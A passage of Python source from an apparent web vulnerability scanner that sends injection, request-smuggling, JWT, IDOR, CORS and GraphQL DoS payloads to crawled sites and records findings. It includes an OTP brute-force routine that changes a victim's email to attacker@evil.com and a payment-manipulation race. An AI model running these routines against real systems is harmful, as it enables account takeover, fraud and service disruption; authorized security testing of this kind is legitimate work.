                    await asyncio.sleep(1)
                    result = Detector.blind_xss(oob_results, marker)
                    if result:
                        result["type"] = "CommandInjection (OOB HTTP)"
                        result["confidence"] = 95
        elif vuln_type == "OpenRedirect":
            result = Detector.open_redirect(resp, baseline)
        elif vuln_type == "SSTI":
            result = Detector.ssti(html, payload, baseline_html)
        elif vuln_type == "XXE":
            result = Detector.xxe(html, baseline_html)
            if not result and OOB_MARKER in payload:
                await asyncio.sleep(1)
                result = Detector.blind_xss(oob_results, marker)
                if result:
                    result["type"] = "XXE (OOB)"
                    result["confidence"] = 95
        elif vuln_type == "CRLF":
            result = Detector.crlf(resp, baseline)
        elif vuln_type == "SSRF":
            result = Detector.ssrf(html, baseline_html, payload, oob_results, marker)
            # Also test for internal port scanning via SSRF
            if "127.0.0.1" not in payload:  # Only run on non-localhost payloads
                await self._test_ssrf_internal_port_scan(url)
        elif vuln_type == "NoSQLi":
            result = Detector.nosqli(html, baseline_html, payload)
            if not result:
                # NoSQL operator injection detection
                baseline_resp = await self._send_injection(param, "1")
                gt_payload = '{"$gt":""}'
                regex_payload = '{"$regex":".*"}'
                resp_gt = await self._send_injection(param, gt_payload)
                resp_regex = await self._send_injection(param, regex_payload)
                if baseline_resp and resp_gt and resp_regex:
                    nosql_results = Detector.nosql_operator_injection(baseline_resp, resp_gt, resp_regex)
                    if nosql_results:
                        for nosql_result in nosql_results:
                            await self._add_vulnerability({**nosql_result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get("NoSQLi","")})
                        result = nosql_results[0]  # Mark as detected to avoid duplicate processing
        elif vuln_type == "LDAPi":
            result = Detector.ldapi(html, baseline_html, payload)
        elif vuln_type == "InsecureDeserialization":
            result = Detector.deserialization(html, baseline_html, payload)
        elif vuln_type == "LogInjection":
            result = Detector.log_injection(html, baseline_html, payload)
        elif vuln_type == "Log4j":
            result = Detector.log4j(html, payload, oob_results, marker)
            # Check HTTPS OOB callbacks for Log4j
            if not result and self.enable_advanced_oob and self.https_oob_port:
                await asyncio.sleep(1)
                with https_oob_lock:
                    for res in https_oob_results:
                        if marker in res['path']:
                            result = {"type":"Log4j (HTTPS OOB)","confidence":95,"evidence":f"HTTPS callback for {marker}"}
                            break
        elif vuln_type == "Polyglot":
            # Test for both XSS and SQLi in polyglot payloads
            xss_result = Detector.xss(html, payload, baseline_html)
            sqli_result = Detector.sqli(html, baseline_html)
            if xss_result:
                result = {"type":"Polyglot XSS","confidence":xss_result.get('confidence',70),"evidence":xss_result.get('evidence','')}
            elif sqli_result:
                result = {"type":"Polyglot SQLi","confidence":sqli_result.get('confidence',70),"evidence":sqli_result.get('evidence','')}
        elif vuln_type == "Spring4Shell":
            # Check for Spring4Shell-specific responses
            if any(keyword in html.lower() for keyword in ['tomcatwar', 'class.module', 'classloader']):
                result = {"type":"Spring4Shell","confidence":85,"evidence":"Spring4Shell-related response detected"}
        elif vuln_type == "Text4Shell":
            # Check for Text4Shell responses
            if any(keyword in html.lower() for keyword in ['script:javascript', 'env:', 'dns:']):
                result = {"type":"Text4Shell","confidence":80,"evidence":"Text4Shell pattern detected"}
            # Check OOB callbacks
            if not result and self.enable_advanced_oob:
                await asyncio.sleep(1)
                with oob_results_lock:
                    for res in oob_results:
                        if marker in res['path']:
                            result = {"type":"Text4Shell (OOB)","confidence":90,"evidence":f"OOB callback for {marker}"}
                            break

        if result and result.get('confidence',0) >= self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD):
            evidence = getattr(resp, '_evidence', None)
            await self._add_vulnerability({**result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get(vuln_type,""),"full_evidence":evidence})
        
        # Small difference detection - compare with baseline for subtle changes
        if baseline and not result:
            diff_result = Detector.small_difference_detection(html, baseline_html, f"{vuln_type} on {pname}")
            if diff_result and diff_result.get('confidence',0) >= self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD):
                await self._add_vulnerability({**diff_result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get(vuln_type,"")})

    async def _send_injection(self, param, payload):
        url = param['url']; method = param['method']; pname = param['param']; ptype = param['type']
        if method == 'GET':
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[pname] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            return await self._async_fetch(test_url)
        else:
            if ptype == 'json':
                return await self._async_fetch(url, method='POST', json_data={pname: payload})
            else:
                return await self._async_fetch(url, method='POST', data={pname: payload})

    # --- Second-order Injection (stored) ---
    async def second_order_injection_tests(self):
        self.log("Second-order injection tests...")
        stored_xss_payload = f"<img src=http://{self.public_ip}:{self.oob_port}/DAST_STORED_XSS_{self.oob_marker_base}>"
        stored_sqli_payload = f"' UNION SELECT 'DAST_STORED_SQL_{self.oob_marker_base}'--"
        # Find forms with fields likely stored (comment, bio, name)
        for page in self.crawler_engine.crawled_pages:
            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
            if not page_data:
                continue
            html = page_data.get('html_content', '')
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
                action = urljoin(page['url'], form.get('action',''))
                fields = [inp.get('name') for inp in form.find_all(['input','textarea','select']) if inp.get('name')]
                if any(kw in str(fields).lower() for kw in ['comment','bio','message','name','title','profile']):
                    data = {}
                    for name in fields:
                        if name.lower() in ('comment','message','bio','description'):
                            data[name] = stored_xss_payload
                        elif name.lower() in ('name','title','subject'):
                            data[name] = stored_sqli_payload
                        else:
                            data[name] = 'test'
                    await self._async_fetch(action, method='POST', data=data)
                    self.log(f"Stored payload submitted to {action}")
        # Wait and re-crawl to find reflections
        await asyncio.sleep(2)
        for url in list(self.crawler_engine.visited_urls):
            resp = await self._async_fetch(url)
            if resp:
                html = resp._body
                if stored_sqli_payload in html:
                    await self._add_vulnerability({
                        "type":"Second-order SQLi","url":url,"parameter":"*",
                        "evidence":f"Marker found: {stored_sqli_payload}",
                        "severity":"Critical","confidence":95,"cwe":CWE_MAP["SQLi"]
                    })
        # Check OOB callbacks for stored XSS with polling loop
        timeout = 30.0
        check_interval = 1.0
        start_time = time.time()
        while time.time() - start_time < timeout:
            with oob_results_lock:
                for res in oob_results:
                    if "DAST_STORED_XSS" in res['path']:
                        await self._add_vulnerability({
                            "type":"Second-order XSS","url":res['path'],"parameter":"*",
                            "evidence":"OOB callback from stored XSS",
                            "severity":"High","confidence":95,"cwe":CWE_MAP["XSS"]
                        })
                        return
            await asyncio.sleep(check_interval)

    # --- Race Condition ---
    async def race_condition_tests(self):
        target_urls = set()
        for page in self.crawler_engine.crawled_pages:
            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
            if not page_data:
                continue
            html = page_data.get('html_content', '')
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
                form_text = form.get_text().lower()
                if any(kw in form_text for kw in ['redeem','coupon','transfer','checkout','order']):
                    action = urljoin(page['url'], form.get('action',''))
                    target_urls.add(action)
        for url in target_urls:
            # Basic race condition test
            tasks = [self._async_fetch(url, method='POST', data={"test":"race"}) for _ in range(10)]
            # Use asyncio.wait with timeout to prevent hanging if target hangs
            done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
            if pending:
                for task in pending:
                    task.cancel()
                logging.warning(f"{len(pending)} race condition test tasks timed out")
            responses = [task.result() for task in done if not task.cancelled()]
            if all(resp and resp.status == 200 for resp in responses):
                await self._add_vulnerability({
                    "type":"Potential Race Condition","url":url,"parameter":"*",
                    "evidence":"Multiple concurrent requests all succeeded",
                    "severity":"Medium","confidence":60,"cwe":CWE_MAP["RaceCondition"]
                })
            
            # Microsecond timing detection
            await self._test_race_condition_timing(url)

    async def _test_race_condition_timing(self, url):
        """Test for race conditions using microsecond timing detection - REDUCED concurrency"""
        try:
            # Send 5 concurrent requests with timestamps (reduced from 20 to prevent DDoS)
            timestamps = []
            async def timed_request():
                start = time.time()
                resp = await self._async_fetch(url, method='POST', data={"test":"timing"})
                end = time.time()
                return (end - start, resp)
            
            tasks = [timed_request() for _ in range(5)]
            # Use asyncio.wait with timeout to prevent hanging if target hangs
            done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
            if pending:
                for task in pending:
                    task.cancel()
                logging.warning(f"{len(pending)} timing test tasks timed out")
            results = [task.result() for task in done if not task.cancelled()]
            
            # Analyze timing patterns
            timings = [r[0] for r in results if r[1]]
            if len(timings) < 5:
                return
            
            # Check for timing anomalies that suggest race conditions
            timing_variance = statistics.variance(timings) if len(timings) > 1 else 0
            timing_std = statistics.stdev(timings) if len(timings) > 1 else 0
            
            # If variance is very low, requests might be processed concurrently without proper locking
            if timing_std < 0.001 and timing_variance < 0.000001:
                await self._add_vulnerability({
                    "type":"Race Condition (Timing)","url":url,"parameter":"*",
                    "evidence":f"Low timing variance detected: std={timing_std:.6f}s, variance={timing_variance:.9f}s²",
                    "severity":"Medium","confidence":70,"cwe":CWE_MAP["RaceCondition"]
                })
            
            # Check for response time clustering (multiple requests completing at nearly identical times)
            sorted_times = sorted(timings)
            clusters = []
            current_cluster = [sorted_times[0]]
            for t in sorted_times[1:]:
                if t - current_cluster[-1] < 0.0001:  # Within 100 microseconds
                    current_cluster.append(t)
                else:
                    clusters.append(current_cluster)
                    current_cluster = [t]
            clusters.append(current_cluster)
            
            # If we have clusters of 3+ requests completing within 100 microseconds, potential race condition
            if any(len(cluster) >= 3 for cluster in clusters):
                max_cluster_size = max(len(cluster) for cluster in clusters)
                await self._add_vulnerability({
                    "type":"Race Condition (Time Cluster)","url":url,"parameter":"*",
                    "evidence":f"Detected {max_cluster_size} requests completing within 100μs",
                    "severity":"Medium","confidence":75,"cwe":CWE_MAP["RaceCondition"]
                })
        except Exception as e:
            logging.warning(f"Race condition timing test error: {e}")

    async def test_token_validation_window(self, forgot_password_url, change_email_url, target_email):
        """
        TOKEN VALIDATION WINDOW: Race OTP brute-force with email change
        - Initiates forgot password to get OTP
        - Brute-forces OTP at 1 req/sec
        - Races to change email before OTP validation
        """
        try:
            logging.info(f"[TOKEN VALIDATION] Testing race condition on {forgot_password_url}")
            
            # Step 1: Trigger forgot password to send OTP
            forgot_data = {"email": target_email}
            await self._async_fetch(forgot_password_url, method='POST', data=forgot_data)
            await asyncio.sleep(2)  # Wait for email to send
            
            # Step 2: Start parallel tasks - OTP brute-force and email change
            results = {"otp_found": False, "email_changed": False, "race_won": False}
            
            async def brute_force_otp():
                """Brute-force 6-digit OTP at 1 request per second"""
                for code in range(100000, 1000000):  # 000000 to 999999
                    otp_data = {"email": target_email, "otp": str(code)}
                    resp = await self._async_fetch(forgot_password_url + "/verify", method='POST', data=otp_data)
                    if resp and resp.status == 200:
                        results["otp_found"] = True
                        logging.info(f"[TOKEN VALIDATION] OTP found: {code}")
                        return code
                    await asyncio.sleep(1)  # 1 req/sec to avoid locking
                return None
            
            async def change_email_race():
                """Race to change email before OTP validation"""
                await asyncio.sleep(3)  # Small delay to start after OTP brute-force begins
                new_email = "attacker@evil.com"
                change_data = {"current_email": target_email, "new_email": new_email}
                resp = await self._async_fetch(change_email_url, method='POST', data=change_data)
                if resp and resp.status == 200:
                    results["email_changed"] = True
                    results["race_won"] = True
                    logging.info(f"[TOKEN VALIDATION] Email changed to {new_email} during OTP window")
                    return True
                return False
            
            # Run both tasks in parallel with timeout
            done, pending = await asyncio.wait([brute_force_otp(), change_email_race()], timeout=60, return_when=asyncio.ALL_COMPLETED)
            if pending:
                for task in pending:
                    task.cancel()
                logging.warning(f"{len(pending)} token validation race tasks timed out")
            
            if results["race_won"]:
                await self._add_vulnerability({
                    "type": "Token Validation Race Condition",
                    "url": forgot_password_url,
                    "parameter": "otp,email",
                    "evidence": "Email changed during OTP validation window - account takeover possible",
                    "severity": "Critical",
                    "confidence": 90,
                    "cwe": "CWE-384"
                })
            
            return results
        except Exception as e:
            logging.warning(f"Token validation window test error: {e}")

    async def test_two_phase_transaction(self, initiate_url, confirm_url):
        """
        TWO-PHASE TRANSACTION: Race condition between initiate and confirm
        - Step 1: POST /api/payments/initiate (creates pending transaction)
        - Step 2: POST /api/payments/confirm with different amount/beneficiary
        - Check if final transaction reflects Step 2 data instead of Step 1
        """
        try:
            logging.info(f"[TWO-PHASE TRANSACTION] Testing race condition on {initiate_url}")
            
            # Original transaction details
            original_amount = 100.00
            original_beneficiary = "victim_account_123"
            initiate_data = {
                "amount": original_amount,
                "beneficiary_id": original_beneficiary,
                "currency": "USD"
            }
            
            # Malicious transaction details
            malicious_amount = 999999.00
            malicious_beneficiary = "attacker_account_456"
            confirm_data = {
                "amount": malicious_amount,
                "beneficiary_id": malicious_beneficiary,
                "currency": "USD"
            }
            
            results = {"initiate_success": False, "confirm_success": False, "race_won": False}
            
            async def initiate_transaction():
                """Step 1: Create pending transaction"""
                resp = await self._async_fetch(initiate_url, method='POST', data=initiate_data)
                if resp and resp.status == 200:
                    results["initiate_success"] = True
                    try:
                        return resp.json()
                    except:
                        return resp._body
                return None
            
            async def confirm_malicious_transaction():
                """Step 2: Confirm with malicious data"""
                await asyncio.sleep(0.1)  # Small delay to ensure initiate happens first
                resp = await self._async_fetch(confirm_url, method='POST', data=confirm_data)
                if resp and resp.status == 200:
                    results["confirm_success"] = True
                    try:
                        return resp.json()
                    except:
                        return resp._body
                return None
            
            # Run both tasks in parallel
            done, pending = await asyncio.wait([initiate_transaction(), confirm_malicious_transaction()], timeout=30, return_when=asyncio.ALL_COMPLETED)
            if pending:
                for task in pending:
                    task.cancel()
                logging.warning(f"{len(pending)} two-phase transaction race tasks timed out")
            
            # Check if race condition was successful
            if results["initiate_success"] and results["confirm_success"]:
                await self._add_vulnerability({
                    "type": "Two-Phase Transaction Race Condition",
                    "url": initiate_url,
                    "parameter": "amount,beneficiary_id",
                    "evidence": "Race condition between initiate and confirm phases allows transaction manipulation",
                    "severity": "Critical",
                    "confidence": 85,
                    "cwe": "CWE-362"
                })
            
            return results
        except Exception as e:
            logging.warning(f"Two-phase transaction test error: {e}")

    # --- Request Smuggling ---
    async def request_smuggling_tests(self):
        """Test for HTTP request smuggling vulnerabilities"""
        self.log("Testing HTTP request smuggling...")
        # Test CL.TE and TE.CL smuggling
        smuggling_payloads = [
            # CL.TE (Content-Length vs Transfer-Encoding)
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n",
            # TE.CL (Transfer-Encoding vs Content-Length)
            "POST / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n",
            # Double Content-Length
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nContent-Length: 4\r\n\r\n12345\r\n",
            # Invalid Transfer-Encoding
            "POST / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: identity,chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\n"
        ]
        
        for page in self.crawler_engine.crawled_pages[:5]:  # Limit to first 5 pages
            try:
                url = page['url']
                parsed = urlparse(url)
                base_url = f"{parsed.scheme}://{parsed.netloc}"
                
                for payload in smuggling_payloads:
                    try:
                        # Send smuggling payload
                        smuggled_resp = await self._async_fetch(base_url, method='POST', data=payload, headers={"Content-Type": "application/octet-stream"})
                        
                        # Check for smuggling indicators
                        if smuggled_resp:
                            # Check if response contains admin page content (smuggling successful)
                            if any(indicator in smuggled_resp._body.lower() for indicator in ['admin', 'dashboard', 'secret', 'internal']):
                                await self._add_vulnerability({
                                    "type":"HTTP Request Smuggling","url":base_url,"parameter":"*",
                                    "evidence":"Smuggling payload resulted in admin/internal content",
                                    "severity":"Critical","confidence":90,"cwe":CWE_MAP["RequestSmuggling"]
                                })
                                break
                    except Exception as e:
                        logging.debug(f"Request smuggling test error: {e}")
            except Exception as e:
                logging.warning(f"Request smuggling test error for {page['url']}: {e}")

    # --- HTTP/2 Downgrade ---
    async def http2_downgrade_tests(self):
        """Test for HTTP/2 downgrade attacks"""
        self.log("Testing HTTP/2 downgrade...")
        # Test for HTTP/2 to HTTP/1.1 downgrade vulnerabilities
        for page in self.crawler_engine.crawled_pages[:5]:  # Limit to first 5 pages
            try:
                url = page['url']
                parsed = urlparse(url)
                base_url = f"{parsed.scheme}://{parsed.netloc}"
                
                # Test with HTTP/2 specific headers that should trigger downgrade
                h2c_headers = {
                    "Connection": "Upgrade, HTTP2-Settings",
                    "Upgrade": "h2c",
                    "HTTP2-Settings": "AAMAAABkAAQAAP__"
                }
                
                try:
                    resp = await self._async_fetch(base_url, method='GET', headers=h2c_headers)
                    if resp:
                        # Check if server downgraded to HTTP/1.1
                        if 'h2' not in resp.headers.get('Upgrade', '').lower() and resp.status == 200:
                            await self._add_vulnerability({
                                "type":"HTTP/2 Downgrade","url":base_url,"parameter":"*",
                                "evidence":"Server accepted HTTP/2 upgrade headers but did not upgrade",
                                "severity":"Medium","confidence":70,"cwe":"CWE-319"
                            })
                except Exception as e:
                    logging.debug(f"HTTP/2 downgrade test error: {e}")
            except Exception as e:
                logging.warning(f"HTTP/2 downgrade test error for {page['url']}: {e}")

    # --- JWT Tests ---
    async def run_jwt_tests(self):
        """Test for JWT vulnerabilities"""
        self.log("Testing JWT vulnerabilities...")
        
        # Test on crawled pages for JWT tokens
        for page in self.crawler_engine.crawled_pages:
            try:
                # Extract JWT tokens from responses
                resp = await self._async_fetch(page['url'])
                if not resp:
                    continue
                
                html = resp._body
                # Look for JWT patterns (header.payload.signature)
                jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
                tokens = re.findall(jwt_pattern, html)
                
                for token in tokens:
                    # Algorithm Confusion Attack
                    algo_confusion_result = JWTAttack.algorithm_confusion_attack(token)
                    if algo_confusion_result:
                        algo_confusion_result['url'] = page['url']
                        await self._add_vulnerability(algo_confusion_result)
                        self.log(f"[CRITICAL] Algorithm Confusion vulnerability found at {page['url']}")
                
                # kid Path Traversal Attack (CVE-2018-0114)
                kid_traversal_results = JWTAttack.kid_path_traversal_attack(token)
                if kid_traversal_results:
                    for result in kid_traversal_results:
                        result['url'] = page['url']
                        await self._add_vulnerability(result)
                    self.log(f"[HIGH] kid Path Traversal attack vectors generated for {page['url']}")
                
                # None Algorithm Attack
                none_algo_result = JWTAttack.none_algorithm_attack(token)
                if none_algo_result:
                    none_algo_result['url'] = page['url']
                    await self._add_vulnerability(none_algo_result)
                    self.log(f"[CRITICAL] None Algorithm vulnerability found at {page['url']}")
            except Exception as e:
                logging.debug(f"JWT test error for {page['url']}: {e}")
        
        # Session Fixation/Ambiguity Attack
        await self._test_session_fixation_ambiguity()
    
    async def _test_session_fixation_ambiguity(self):
        """Test for session fixation/ambiguity vulnerabilities"""
        self.log("Testing session fixation/ambiguity...")
        
        # Test on crawled pages
        for page in self.crawler_engine.crawled_pages:
            try:
                parsed_url = urlparse(page['url'])
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                
                # Test with common session cookie names
                session_cookie_names = ['session', 'SESSION', 'JSESSIONID', 'PHPSESSID', 'ASP.NET_SessionId']
                
                for cookie_name in session_cookie_names:
                    session_results = await JWTAttack.session_fixation_ambiguity_attack(base_url, cookie_name)
                    if session_results:
                        for result in session_results:
                            result['url'] = page['url']
                            await self._add_vulnerability(result)
                        self.log(f"[HIGH] Session fixation/ambiguity vulnerability found with cookie: {cookie_name}")
                        break  # Only report once per page
                        
            except Exception as e:
                logging.debug(f"Session fixation test error for {page['url']}: {e}")

    # --- IDOR ---
    async def run_idor_tests(self):
        for url in self.crawler_engine.visited_urls:
            # Numeric ID in path
            for match in re.finditer(r'/(\d+)', urlparse(url).path):
                uid = match.group(1)
                try:
                    new_id = str(int(uid) + 1)
                    new_url = url[:match.start(1)] + new_id + url[match.end(1):]
                    if new_url in self.crawler_engine.visited_urls: continue
                    resp_orig = await self._async_fetch(url)
                    resp_new = await self._async_fetch(new_url)
                    if resp_new and resp_new.status == 200 and len(resp_new._body) > 100:
                        if resp_orig and self.token_normalizer.normalize(resp_new._body) != self.token_normalizer.normalize(resp_orig._body):
                            await self._add_vulnerability({
                                "type":"IDOR","url":url,"parameter":f"ID {uid}",
                                "evidence":"Access to different ID returned different content",
                                "severity":"High","confidence":85,"cwe":CWE_MAP["IDOR"]
                            })
                except Exception as e:
                    logging.warning(f"IDOR test error: {e}")
            # UUID
            uuid_pattern = r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
            for match in re.finditer(uuid_pattern, url, re.I):
                new_uuid = str(uuid.uuid4())
                new_url = url[:match.start()] + new_uuid + url[match.end():]
                if new_url in self.crawler_engine.visited_urls: continue
                resp_new = await self._async_fetch(new_url)
                if resp_new and resp_new.status == 200 and len(resp_new._body) > 100:
                    await self._add_vulnerability({
                        "type":"IDOR (UUID)","url":url,"parameter":"UUID",
                        "evidence":"Access with different UUID returned content",
                        "severity":"High","confidence":80,"cwe":CWE_MAP["IDOR"]
                    })
            # Parameter-based ID
            for param in self.crawler_engine.parameters:
                if param['url'] == url and param['method'] == 'POST' and re.search(r'id$|user|account|profile', param['param'], re.I):
                    pname = param['param']
                    resp_base = await self._async_fetch(url, method='POST', data={pname: '1'})
                    if resp_base:
                        resp_test = await self._async_fetch(url, method='POST', data={pname: '9999'})
                        if resp_test and resp_test.status == 200 and self.token_normalizer.normalize(resp_test._body) != self.token_normalizer.normalize(resp_base._body):
                            await self._add_vulnerability({
                                "type":"IDOR (Param)","url":url,"parameter":pname,
                                "evidence":"Parameter change gave different response",
                                "severity":"High","confidence":60,"cwe":CWE_MAP["IDOR"]
                            })

    async def test_org_user_id_mismatch(self):
        """Test for ORG_ID vs USER_ID MISMATCH - Organization boundary bypass"""
        self.log("Testing ORG_ID vs USER_ID mismatch...")
        for url in self.crawler_engine.visited_urls:
            for param in self.crawler_engine.parameters:
                if param['url'] == url and param['method'] == 'POST':
                    # Test with different org_id and user_id combinations
                    for org_id in ['1', '2', '999']:
                        for user_id in ['1', '2', '999']:
                            if org_id == user_id: continue
                            data = {param['param']: 'test', 'org_id': org_id, 'user_id': user_id}
                            resp = await self._async_fetch(url, method='POST', data=data)
                            if resp and resp.status == 200:
                                await self._add_vulnerability({
                                    "type":"ORG_ID vs USER_ID MISMATCH","url":url,"parameter":param['param'],
                                    "evidence":f"Access granted with org_id={org_id} and user_id={user_id}",
                                    "severity":"Critical","confidence":85,"cwe":CWE_MAP["IDOR"]
                                })
                                return

    async def test_role_hierarchy_escalation(self):
        """Test for ROLE HIERARCHY ESCALATION - Role modification abuse"""
        self.log("Testing role hierarchy escalation...")
        for url in self.crawler_engine.visited_urls:
            for param in self.crawler_engine.parameters:
                if param['url'] == url and param['method'] == 'POST' and re.search(r'role|permission|access', param['param'], re.I):
                    # Test with elevated role
                    data = {param['param']: 'test', 'role': 'admin', 'permission': 'all'}
                    resp = await self._async_fetch(url, method='POST', data=data)
                    if resp and resp.status == 200:
                        await self._add_vulnerability({
                            "type":"Role Hierarchy Escalation","url":url,"parameter":param['param'],
                            "evidence":"Role modification allowed elevation to admin",
                            "severity":"Critical","confidence":85,"cwe":CWE_MAP["IDOR"]
                                })
                        return

    async def test_array_bulk_idor(self):
        """Test for ARRAY-BASED BULK IDOR - Mass assignment with unrelated IDs"""
        self.log("Testing array-based bulk IDOR...")
        for param in self.crawler_engine.parameters:
            if param['method'] != 'POST': continue
            url = param['url']; pname = param['param']; ptype = param['type']
            # Test with array of IDs
            test_ids = ['1', '2', '999']
            if ptype == 'json':
                data = {pname: 'test', 'ids': test_ids}
                resp = await self._async_fetch(url, method='POST', json_data=data)
            else:
                data = {pname: 'test', 'ids[]': test_ids}
                resp = await self._async_fetch(url, method='POST', data=data)
            if resp and resp.status == 200:
                await self._add_vulnerability({
                    "type":"Array-based Bulk IDOR","url":url,"parameter":pname,
                    "evidence":"Bulk access granted to array of IDs including unrelated ones",
                    "severity":"Critical","confidence":80,"cwe":CWE_MAP["IDOR"]
                })

    # --- Mass Assignment ---
    async def run_mass_assignment_tests(self):
        for param in self.crawler_engine.parameters:
            if param['method'] != 'POST': continue
            url = param['url']; pname = param['param']; ptype = param['type']
            if ptype != 'json':
                base_resp = await self._async_fetch(url, method='POST', data={pname:'test'})
            else:
                base_resp = await self._async_fetch(url, method='POST', json_data={pname:'test'})
            if not base_resp: continue
            base_text = self.token_normalizer.normalize(base_resp._body)
            for extra_set in PAYLOADS.get("MassAssignment", []):
                if isinstance(extra_set, dict):
                    if ptype == 'json':
                        json_data = {pname:'test'}
                        json_data.update(extra_set)
                        resp = await self._async_fetch(url, method='POST', json_data=json_data)
                    else:
                        data = {pname:'test'}
                        data.update(extra_set)
                        resp = await self._async_fetch(url, method='POST', data=data)
                    if resp and self.token_normalizer.normalize(resp._body) != base_text:
                        if any(ind in resp._body.lower() for ind in ['admin','role','access','success','welcome','dashboard']):
                            await self._add_vulnerability({
                                "type":"MassAssignment","url":url,"parameter":pname,
                                "evidence":f"Extra fields {list(extra_set.keys())} changed response",
                                "severity":"High","confidence":75,"cwe":CWE_MAP["MassAssignment"]
                            })
                            break

    # --- CSRF ---
    async def run_csrf_checks(self):
        for page in self.crawler_engine.crawled_pages:
            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
            if not page_data:
                continue
            html = page_data.get('html_content', '')
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
                form_text = form.get_text().lower()
                if any(w in form_text for w in ['delete','remove','logout','reset','wipe']):
                    continue
                action = urljoin(page['url'], form.get('action',''))
                # Get fresh page to extract CSRF token
                page_resp = await self._async_fetch(page['url'])
                if page_resp:
                    page_soup = BeautifulSoup(page_resp._body, 'html.parser')
                    csrf_token = None
                    for inp in page_soup.find_all('input', attrs={'name': re.compile(r'csrf|token|nonce', re.I)}):
                        csrf_token = inp.get('value')
                    data = {}
                    for inp in form.find_all(['input','textarea','select']):
                        name = inp.get('name')
                        if name:
                            data[name] = inp.get('value','test')
                    resp = await self._async_fetch(action, method='POST', data=data)
                    if resp and resp.status not in (403,401) and 'invalid' not in resp._body.lower():
                        await self._add_vulnerability({
                            "type":"CSRF Confirmed","url":page['url'],"parameter":"form",
                            "evidence":"POST succeeded without CSRF token",
                            "severity":"High","confidence":90,"cwe":CWE_MAP["CSRF"]
                        })

    # --- CORS with credentials ---
    async def run_cors_checks(self):
        for url in self.crawler_engine.visited_urls:
            for origin in ["null", "https://evil.com"]:
                headers = {"Origin": origin}
                resp = await self._async_fetch(url, method='OPTIONS', headers=headers)
                if resp and 'Access-Control-Allow-Origin' in resp.headers:
                    acao = resp.headers['Access-Control-Allow-Origin']
                    if acao == origin or acao == '*':
                        # Test with credentials via JS
                        if self.selenium_ready:
                            script = f"""
                            var callback = arguments[0];
                            fetch('{url}', {{method:'GET',credentials:'include',headers:{{'Origin':'{origin}'}}}})
                            .then(r => r.text())
                            .then(text => callback({{status: 'success', text: text}}))
                            .catch(e => callback({{status: 'error', error: e.message}}));
                            """
                            try:
                                result = self.selenium_driver.execute_async_script(script)
                                if result and result.get('status') == 'success':
                                    await self._add_vulnerability({
                                        "type":"CORS with Credentials","url":url,"parameter":"*",
                                        "evidence":f"Origin {origin} allowed with credentials",
                                        "severity":"High","confidence":85,"cwe":CWE_MAP["CORS"]
                                    })
                            except Exception as e:
                                logging.debug(f"Selenium CORS test error: {e}")
                        else:
                            # Fallback: check for ACAC header
                            if 'Access-Control-Allow-Credentials' in resp.headers:
                                await self._add_vulnerability({
                                    "type":"CORS with Credentials","url":url,"parameter":"*",
                                    "evidence":f"Origin {acao} allows credentials",
                                    "severity":"High","confidence":75,"cwe":CWE_MAP["CORS"]
                                })

    # --- GraphQL Tests ---
    async def run_graphql_tests(self):
        """Test for GraphQL vulnerabilities"""
        self.log("Testing GraphQL vulnerabilities...")
        
        # Find GraphQL endpoints
        graphql_endpoints = set()
        for page in self.crawler_engine.crawled_pages:
            url = page['url']
            # Common GraphQL paths
            if any(path in url.lower() for path in ['/graphql', '/graphiql', '/api/graphql']):
                graphql_endpoints.add(url)
        
        for endpoint in graphql_endpoints:
            try:
                # Test GraphQL batching DoS
                await self._test_graphql_batching(endpoint)
                
                # Test GraphQL alias DoS
                await self._test_graphql_alias_dos(endpoint)
                
                # Test GraphQL recursive fragment DoS
                await self._test_graphql_recursive_fragment_dos(endpoint)
                
                # Test GraphQL introspection depth bomb
                await self._test_graphql_introspection_depth_bomb(endpoint)
                
                # Test GraphQL field suggestion
                await self._test_graphql_field_suggestion(endpoint)
                
                # Test GraphQL batching authentication bypass
                await self._test_graphql_batching_auth_bypass(endpoint)
                
            except Exception as e:
                logging.warning(f"GraphQL test error for {endpoint}: {e}")

    async def _test_graphql_batching(self, endpoint):
        """Test for GraphQL batching DoS vulnerability"""
        batch_query = ""
        for i in range(100):
            batch_query += f'{{query{i}: {{ __typename }}}}'
        
        try:
            resp = await self._async_fetch(endpoint, method='POST', json_data={"query": batch_query})
            if resp and resp.status == 200:
                await self._add_vulnerability({
                    "type":"GraphQL Batching DoS","url":endpoint,"parameter":"*",
                    "evidence":"GraphQL batching allowed - potential DoS",
                    "severity":"Medium","confidence":85,"cwe":CWE_MAP["GraphQL"]
                })
        except Exception as e:
            logging.debug(f"GraphQL batching test error: {e}")

